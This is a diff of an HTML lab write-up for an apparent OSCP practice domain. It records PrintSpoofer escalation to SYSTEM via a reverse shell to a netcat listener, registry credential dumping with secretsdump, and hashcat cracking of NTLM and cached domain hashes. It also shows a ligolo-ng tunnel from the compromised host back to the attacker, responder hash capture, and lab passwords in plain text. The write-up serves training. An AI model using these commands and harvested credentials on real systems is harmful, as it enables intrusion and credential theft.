+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>-M<span class="w"> </span>gpp_autologin
 </pre></div>
 <p>A <code>cpassword</code> in <code>SYSVOL</code> decrypts with a published key, so any hit is immediate plaintext.</p>
 <hr />
@@ -1316,7 +1330,7 @@ nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.
 privilege at all, because <code>public</code> can execute it:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-v
 </pre></div>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">'\\&lt;tun0-address&gt;\loot'</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\&lt;tun0-address&gt;\loot&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </pre></div>
 <p>The outbound authentication comes from the <strong>MSSQL service account</strong>, not from the SQL login that
 issued the query. Crack the NetNTLMv2 with <code>hashcat -m 5600</code>. Same target as 7.2, reached without
@@ -1325,7 +1339,7 @@ Kerberos — which makes it the fallback of choice while DNS and the clock are s
 <h3>7.6 Action 5 — Re-collect once Kerberos works</h3>
 <p>The graph in chapter 05 came from an NTLM fallback with <strong>zero</strong> session results. A Kerberos-backed
 collection may expose sessions and local group memberships this run could not see:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-dc<span class="w"> </span>DC01.oscp.exam<span class="w"> </span>-c<span class="w"> </span>All
 </pre></div>
 <p>Treat the empty session table as <strong>"not observed"</strong>, not "proven absent", until this runs.</p>
@@ -1348,7 +1362,687 @@ proves the boundary was crossed — and the <code>proof.txt</code> value read in
 <code>hostname</code> and <code>ipconfig</code>, so the result is attributable rather than asserted.</p>
 <p>Until then, the honest statement is the one in chapter 06: <strong>MS02 is a foothold, DC01 is not owned, and
 the way in is a service account whose password has not changed since 2022.</strong></p></div></section>
-<section class="chapter" id="ch-08" data-title="Methodology"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
+<section class="chapter" id="ch-08" data-title="MS01: SYSTEM"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>MS01: SYSTEM</h2><p class="ch-sub">PrintSpoofer, and the local-admin add</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><blockquote>
+<p><strong>Pass 3 — <code>10.10.131.0/24</code>.</strong> Chapters 01–06 document a different position on the same
+directory (<code>10.10.152.0/24</code>), where MS02 was the target and every local path closed. This
+chapter starts from the position that finished the set: MS01 first, then the internal network.</p>
+</blockquote>
+<hr />
+<h3>8.1 Where this pass sits</h3>
+<p>The set was re-instantiated on a new range. The shape is the one from the <code>oscp.exam</code> page
+(MS01 dual-homed, everything else behind it), not the direct-DC shape of pass 2:</p>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>Kali-facing</th>
+<th>Internal</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS01</td>
+<td><code>192.168.131.147</code></td>
+<td><code>10.10.131.147</code></td>
+<td>dual-homed member server</td>
+</tr>
+<tr>
+<td>MS02</td>
+<td>—</td>
+<td><code>10.10.131.148</code></td>
+<td>reachable only through MS01</td>
+</tr>
+<tr>
+<td>DC01</td>
+<td>—</td>
+<td><code>10.10.131.146</code></td>
+<td>reachable only through MS01</td>
+</tr>
+<tr>
+<td>Kali</td>
+<td><code>192.168.45.158</code></td>
+<td>—</td>
+<td>sees MS01 only</td>
+</tr>
+</tbody>
+</table>
+<p>The foothold is the known one: WinRM as <code>OSCP\eric.wallows</code> with <code>EricLikesRunning800</code>. Unlike
+<code>celia.almeda</code> on MS02, this token holds <strong><code>SeImpersonatePrivilege</code></strong> — which is the whole
+difference between the two positions. This run does not include a <code>whoami /priv</code> of its own; the
+privilege is the one PrintSpoofer reports finding, one step below.</p>
+<p>That privilege is the escalation primitive pass 2 did not have. It does not need a vulnerable
+service, a writable path, or a misconfigured ACL — only a process that can be made to
+authenticate to a named pipe we control.</p>
+<hr />
+<h3>8.2 PrintSpoofer</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="p">.\</span><span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">reverse</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK</span></pre></div>
+<p><code>-i</code> asks for an interactive window and <code>-c reverse</code> runs the staged <code>reverse</code> payload (a
+previously generated reverse shell) as the impersonated user. On Kali:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>rlwrap<span class="w"> </span>-cAr<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">listening on [any] 4444 ...
+connect to [192.168.45.158] from (UNKNOWN) [192.168.131.147] 54968
+Microsoft Windows [Version 10.0.19044.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;</span></pre></div>
+<p>The shell is SYSTEM by construction: PrintSpoofer convinces the Print Spooler to connect to its
+named pipe, impersonates the spooler's token, and calls <code>CreateProcessAsUser()</code>. The capture does
+not include a <code>whoami</code> in that window, but the group change below only succeeds with
+administrative rights — which is the practical proof.</p>
+<p>The technique itself is written up in full on the <a href="https://github.com/AV10V/OSCP/blob/main/labs/ad-oscp-exam/03-privilege-escalation.md"><code>oscp.exam</code> page</a>;
+here it is only the way in.</p>
+<hr />
+<h3>8.3 The change that makes the dump possible</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">net localgroup administrators /add Eric.Wallows</span></pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">The command completed successfully.</span></pre></div>
+<p>This looks like a throwaway step. It is the step that turns the WinRM foothold into a remote
+credential dump:</p>
+<ul>
+<li><code>eric.wallows</code> authenticated over WinRM with a <strong>network logon</strong> and a medium-integrity token.
+  That token is not a local administrator's, so it cannot read <code>SAM</code> or <code>SECURITY</code> over SMB.</li>
+<li>Adding the account to <code>BUILTIN\Administrators</code> gives the <em>next</em> logon an administrative token,
+  which is what <code>impacket-secretsdump</code> needs for remote registry access.</li>
+<li>The alternative is to run a dump tool from the SYSTEM shell on the host itself. The group add
+  is cheaper and leaves the tooling on Kali.</li>
+</ul>
+<p>It is also a persistent change to the target. In a real engagement it is reverted at cleanup with
+<code>net localgroup administrators /delete Eric.Wallows</code>; this capture does not show the revert.</p>
+<hr />
+<h3>8.4 A detour worth recording</h3>
+<p>The first two dump attempts were typed into the Windows shell:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">C:\Users\eric.wallows\AppData\Local\Temp&gt;impacket-secretsdump 'Eric.Wallows':'EricLikesRunning800'@192.168.196.147
+'impacket-secretsdump' is not recognized as an internal or external command,
+operable program or batch file.</span></pre></div>
+<p><code>impacket-secretsdump</code> is a Kali console script. It does not exist on Windows, and prefixing it
+with <code>.\</code> does not create it. The dump has to run from Kali against <code>192.168.131.147</code> — which is
+the next chapter.</p>
+<hr />
+<h3>8.5 Position after this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>State</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS01 shell</td>
+<td>SYSTEM (PrintSpoofer)</td>
+</tr>
+<tr>
+<td><code>eric.wallows</code></td>
+<td>now in <code>BUILTIN\Administrators</code></td>
+</tr>
+<tr>
+<td>Credential access</td>
+<td>remote <code>SAM</code> / <code>SECURITY</code> as an administrator</td>
+</tr>
+<tr>
+<td>MS02 / DC01</td>
+<td>untouched — still behind the pivot</td>
+</tr>
+</tbody>
+</table>
+<p>The host is owned. The question is no longer <em>how to escalate</em> but <em>what the registry keeps</em> —
+and on a member server that administrators log on to, that is usually more than LSASS shows.</p></div></section>
+<section class="chapter" id="ch-09" data-title="Credentials and cracks"><div class="ch-head"><span class="ch-num">09</span><div class="ch-title"><h2>Credentials and cracks</h2><p class="ch-sub">SAM, DCC2, and the domain Administrator</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p><code>eric.wallows</code> is an administrator on MS01 now, so the registry is readable over the network.
+What comes back is the material that decides the rest of the set: local hashes, two cached domain
+logons, and an unattended-install password.</p>
+<hr />
+<h3>9.1 The dump</h3>
+<p>Run from Kali, against MS01's Kali-facing address:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-secretsdump<span class="w"> </span><span class="s1">&#39;Eric.Wallows&#39;</span>:<span class="s1">&#39;EricLikesRunning800&#39;</span>@192.168.131.147
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+cloudbase-init:1004:aad3b435b51404eeaad3b435b51404ee:7196a80d9edcc5dc984f6fc9190383f8:::
+Admin:1005:aad3b435b51404eeaad3b435b51404ee:4ca9a2dd36a93bc913bad3487f1ed865:::
+[*] Dumping cached domain logon information (domain/username:hash)
+OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-10 10:06:42+00:00)
+OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2022-12-01 11:08:56+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+OSCP\MS01$:aes256-cts-hmac-sha1-96:dbbbb9735f9000c2fd7ac0b56541e47bb673f64f87786199ec278d48a2c68d0e
+OSCP\MS01$:aes128-cts-hmac-sha1-96:fa7a037d0987c7af07ac50f5a8948101
+OSCP\MS01$:des-cbc-md5:0becb0bf1c261af2
+OSCP\MS01$:plain_password_hex:&lt;machine password hex omitted&gt;
+OSCP\MS01$:aad3b435b51404eeaad3b435b51404ee:102277329cc27c152b4d00358114673b:::
+[*] DefaultPassword
+oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0x14cc9accbb06d4af8f07295749933b06cf0d6dfd
+dpapi_userkey:0x4c31eb802e3529d34f198a0473a6745cf5948527
+[*] NL$KM
+ 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
+ 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.&gt;....1p
+ 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
+ 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
+NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
+[*] _SC_cloudbase-init
+cloudbase-init:xHkv0GSLJ45ShO6ETjQm
+[*] Cleaning up...
+[*] Stopping service RemoteRegistry
+[*] Restoring the disabled state for service RemoteRegistry</span></pre></div>
+<p>The machine-password hex is the one line omitted: it is a long blob and adds nothing the AES keys
+and NTLM value above do not already carry.</p>
+<p>Re-running the same dump as <code>Administrator:December31</code> later in the session returned the same
+values — which is the check that the cracked local password, not just the group membership, is
+real.</p>
+<hr />
+<h3>9.2 Reading the dump</h3>
+<p>There are three different stores in that output, and they are worth keeping apart:</p>
+<table>
+<thead>
+<tr>
+<th>Store</th>
+<th>Entry</th>
+<th>What it is</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SAM</code></td>
+<td><code>Administrator</code></td>
+<td>local account on MS01 — hash <code>3c4495bb…</code></td>
+</tr>
+<tr>
+<td><code>SAM</code></td>
+<td><code>support</code>, <code>Admin</code>, <code>Mary.Williams</code>, <code>cloudbase-init</code></td>
+<td>other local accounts, image passwords</td>
+</tr>
+<tr>
+<td><code>SECURITY</code> (DCC2)</td>
+<td><code>OSCP.EXAM/Administrator</code></td>
+<td>a <strong>cached domain logon</strong> from 2022-11-10</td>
+</tr>
+<tr>
+<td><code>SECURITY</code> (DCC2)</td>
+<td><code>OSCP.EXAM/web_svc</code></td>
+<td>cached domain logon from 2022-12-01</td>
+</tr>
+<tr>
+<td>LSA secret</td>
+<td><code>DefaultPassword</code></td>
+<td>unattended-install password for <code>oscp.exam\celia.almeda</code></td>
+</tr>
+<tr>
+<td>LSA secret</td>
+<td><code>_SC_cloudbase-init</code></td>
+<td>password for the <code>cloudbase-init</code> service account</td>
+</tr>
+<tr>
+<td>LSA secret</td>
+<td><code>$MACHINE.ACC</code></td>
+<td>MS01's machine account keys</td>
+</tr>
+</tbody>
+</table>
+<p>Two entries matter:</p>
+<p><strong>The <code>SAM</code> <code>Administrator</code> hash</strong> is a local credential. Cracked, it gives administrative access
+to MS01 — useful, but MS01 is already owned.</p>
+<p><strong>The DCC2 entry for <code>OSCP.EXAM/Administrator</code></strong> is domain-tier. It is the cached verifier for
+the <em>domain</em> Administrator's interactive logon on this member server, left behind when an
+administrator logged on in 2022. It survives reboots, and it is not in LSASS — which is why the
+earlier LSASS triage on this set found nothing domain-tier.</p>
+<p><code>DefaultPassword</code> is the same value pass 2 used for <code>celia.almeda</code>. Same image, same account; on
+this host, MS01's LSA secrets are one place that credential leaks from.</p>
+<hr />
+<h3>9.3 Cracking the local hashes</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Status...........: Exhausted
+Hash.Mode........: 1000 (NTLM)
+Recovered........: 3/9 (33.33%) Digests (total), 0/9 (0.00%) Digests (new)
+Progress.........: 14344385/14344385 (100.00%)</span></pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--show
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">3c4495bbd678fac8c9d218be4f2bbc7b:December31
+31d6cfe0d16ae931b73c59d7e0c089c0:
+d9358122015c5b159574a88b3c0d2071:Freedom1</span></pre></div>
+<p>Three recovered: <code>Administrator:December31</code>, <code>support:Freedom1</code>, and the empty-password NT hash
+shared by the disabled/default accounts (the blank after the colon is the empty password, not a
+result).</p>
+<p><code>rockyou</code> exhausted the rest — <code>Mary.Williams</code>, <code>Admin</code> and <code>cloudbase-init</code> did not fall to a
+plain dictionary.</p>
+<hr />
+<h3>9.4 Cracking the cache</h3>
+<p>DCC2 is PBKDF2-HMAC-SHA1 with 10,240 iterations and the username as salt, so <code>-m 2100</code> is much
+slower per candidate than raw NTLM. The captured scrollback does not include the <code>-m 2100</code>
+invocation; the mappings below were re-checked against the captured hashes:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a:7Tg9M9MZbzAokR9
+$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3:Diamond1</span></pre></div>
+<p>The second is a password already known from the earlier pages — <code>web_svc:Diamond1</code> — and it
+confirms the cache is genuine: the same account, the same secret, recovered independently.</p>
+<p>The first is the domain Administrator's password, and it is the credential that opens DC01 in
+chapter 12.</p>
+<p>That is the whole chain in one line:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SYSTEM on MS01  →  secretsdump  →  DCC2 cache  →  domain Administrator password</span></pre></div>
+<p>No kerberoast, no MSSQL, no BloodHound edge. The directory was not attacked at all; a member
+server's cache was.</p>
+<hr />
+<h3>9.5 Position after this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>State</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS01 local admin</td>
+<td><code>Administrator:December31</code> (cracked)</td>
+</tr>
+<tr>
+<td>Domain Administrator</td>
+<td><strong>password recovered</strong> from the DCC2 cache</td>
+</tr>
+<tr>
+<td><code>web_svc</code></td>
+<td>confirmed again (<code>Diamond1</code>)</td>
+</tr>
+<tr>
+<td><code>celia.almeda</code></td>
+<td>password leaked in <code>DefaultPassword</code></td>
+</tr>
+<tr>
+<td>DC01</td>
+<td>not touched — but the credential for it is in hand</td>
+</tr>
+</tbody>
+</table>
+<p>The remaining problem is transport: DC01 is on <code>10.10.131.0/24</code>, and Kali cannot route there yet.</p></div></section>
+<section class="chapter" id="ch-10" data-title="Pivot with ligolo-ng"><div class="ch-head"><span class="ch-num">10</span><div class="ch-title"><h2>Pivot with ligolo-ng</h2><p class="ch-sub">A route into <code>10.10.131.0/24</code></p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The credential for DC01 is in hand, but the host is not routable. MS01 is dual-homed: Kali can
+only see <code>192.168.131.147</code>, while MS02 and DC01 live on the internal <code>10.10.131.0/24</code>. This
+chapter builds the route.</p>
+<p>Pass 2 did not need this — DC01 answered directly at <code>10.10.152.140</code>. This pass has the
+MS01-in-front shape, so the tunnel is back.</p>
+<hr />
+<h3>10.1 Proxy on Kali</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cd</span><span class="w"> </span>/opt/Ligolo
+sudo<span class="w"> </span>ligolo-proxy<span class="w"> </span>-laddr<span class="w"> </span><span class="m">0</span>.0.0.0:9999<span class="w"> </span>-selfcert
+</pre></div>
+<p><code>-selfcert</code> generates a self-signed certificate for the relay. The binary is <code>ligolo-proxy</code> in
+current releases; older builds call it <code>proxy</code>. The port is arbitrary, but it has to match the
+agent's <code>-connect</code> address and be reachable from MS01.</p>
+<hr />
+<h3>10.2 Agent on MS01</h3>
+<p>From the SYSTEM shell, switch to PowerShell and run the staged agent:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="p">./</span><span class="n">agent</span> <span class="n">-connect</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">158</span><span class="p">:</span><span class="n">9999</span> <span class="n">-ignore-cert</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">time="2026-11-25T21:05:57-08:00" level=warning msg="warning, certificate validation disabled"
+time="2026-11-25T21:05:57-08:00" level=info msg="Connection established" addr="192.168.45.158:9999"</span></pre></div>
+<p><code>-ignore-cert</code> is required because the proxy's certificate is self-signed. The agent runs in the
+SYSTEM context, so the proxy identifies the session as the machine account:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ligolo-ng » session
+? Specify a session : 1 - OSCP\MS01$@MS01 - 192.168.131.147:55016 - fa163e3be418</span></pre></div>
+<p><code>OSCP\MS01$</code> is the machine account, not <code>eric.wallows</code> — SYSTEM processes authenticate to the
+network as the computer. That name identifies the agent's context only: the tunnel is a relay for
+Kali's own connections, and each protocol still authenticates with whatever credential is passed
+to it.</p>
+<hr />
+<h3>10.3 Route</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[Agent : OSCP\MS01$@MS01] » autoroute
+? Select routes to add: 192.168.131.147/24, 10.10.131.147/24
+? Create a new interface or use an existing one? Use an existing one
+? Select the interface to use lab3 10.4.232.215/24, 172.16.232.254/24
+INFO[0100] Interface lab3 configured (will be created on tunnel start)
+INFO[0100] Creating routes for lab3...
+? Start the tunnel? Yes
+INFO[0102] Starting tunnel to OSCP\MS01$@MS01 (fa163e3be418)
+[Agent : OSCP\MS01$@MS01] »
+192.168.131.147 - done</span></pre></div>
+<p><code>autoroute</code> proposes the subnets the agent can reach — here both of MS01's attached networks. The
+tunnel is a tun interface on Kali, so <code>10.10.131.0/24</code> becomes a normal route: no <code>proxychains</code>
+wrapper, and tools that cannot speak SOCKS work unchanged.</p>
+<p>One caveat in the capture: <code>lab3</code> was already carrying <code>10.4.232.215/24</code> and <code>172.16.232.254/24</code>
+from another lab. Reusing an interface that already has routes is a shortcut; on a busy host,
+create a dedicated interface so <code>ip route</code> stays readable and a teardown does not strand unrelated
+routes.</p>
+<hr />
+<h3>10.4 Result</h3>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Via</th>
+<th>Reaches</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>192.168.131.0/24</code></td>
+<td><code>lab3</code> (ligolo)</td>
+<td>MS01's external network</td>
+</tr>
+<tr>
+<td><code>10.10.131.0/24</code></td>
+<td><code>lab3</code> (ligolo)</td>
+<td>MS02 <code>10.10.131.148</code>, DC01 <code>10.10.131.146</code></td>
+</tr>
+</tbody>
+</table>
+<p>The internal network is now directly addressable from Kali. The agent is still running on MS01;
+the capture does not show it being stopped, and a real cleanup would remove it and tear the
+interface down.</p>
+<p>The next chapter points a scanner at MS02 through the tunnel.</p></div></section>
+<section class="chapter" id="ch-11" data-title="MS02 through the tunnel"><div class="ch-head"><span class="ch-num">11</span><div class="ch-title"><h2>MS02 through the tunnel</h2><p class="ch-sub">Ports, signing, and a 26-minute skew</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>MS02 is the host pass 2 spent six chapters on. In this pass it is reachable through the tunnel
+for the first time, so it gets a full scan — and then the pass walks past it. This chapter records
+what it exposed, the clock problem it created, and why it was not the way in.</p>
+<hr />
+<h3>11.1 The scan</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-p-<span class="w"> </span>-T4<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span>.10.131.148
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Nmap scan report for 10.10.131.148
+Host is up (0.056s latency).
+Not shown: 65528 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+
+Host script results:
+|_clock-skew: 26m04s
+|_nbstat: NetBIOS name: MS02, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: fa:16:3e:3c:33:5f (unknown)
+| smb2-time:
+|   date: 2026-11-26T05:18:26
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 228.09 seconds</span></pre></div>
+<p>The retransmission warning and the timing-stats lines are omitted. The host drops everything
+else — consistent with a host firewall — which is why <code>65528</code> ports are <code>filtered</code> rather than
+<code>closed</code> and why the scan took nearly four minutes.</p>
+<hr />
+<h3>11.2 Reading the ports</h3>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>What it means here</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>135</code>, <code>49664</code>, <code>49667</code></td>
+<td>MSRPC</td>
+<td>endpoint mapper and dynamic RPC — enumeration surface, no credential</td>
+</tr>
+<tr>
+<td><code>139</code>, <code>445</code></td>
+<td>SMB</td>
+<td>file sharing; signing <strong>enabled but not required</strong></td>
+</tr>
+<tr>
+<td><code>5040</code></td>
+<td>unknown</td>
+<td>a Windows service port; not enough banner to identify it</td>
+</tr>
+<tr>
+<td><code>5985</code></td>
+<td>WinRM</td>
+<td>a shell for anyone in <code>Remote Management Users</code></td>
+</tr>
+</tbody>
+</table>
+<p>Two negatives are as useful as the positives:</p>
+<p><strong>No <code>1433</code>.</strong> The MSSQL service that pass 2 built chapters 03 and 07 around is not exposed in
+this instantiation. The SQL path does not exist here.</p>
+<p><strong>No credential was tested against MS02.</strong> The capture contains no SMB, WinRM or MSSQL
+authentication attempt — this chapter is enumeration only. Whether <code>celia.almeda</code>, <code>web_svc</code> or
+the cracked local Administrator would authenticate here is <strong>not established</strong>.</p>
+<p><code>signing enabled but not required</code> is the one configuration worth flagging: it makes MS02 a valid
+relay target in principle. Nothing was coerced into authenticating during this pass, so it stayed
+a note rather than a path.</p>
+<hr />
+<h3>11.3 The 26-minute clock</h3>
+<p><code>nmap</code> reports <code>clock-skew: 26m04s</code>, and <code>smb2-time</code> puts the host at
+<code>2026-11-26T05:18:26Z</code> while Kali is at <code>2026-11-25 20:49 PST</code>. Kerberos rejects any request
+more than five minutes off the KDC, so every Kerberos operation will fail until this is fixed.</p>
+<p>The obvious tools did not work:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>rdate<span class="w"> </span>-n<span class="w"> </span><span class="m">10</span>.10.131.148
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">rdate: Not enough valid responses received in time
+rdate: Unable to get a reasonable time estimate</span></pre></div>
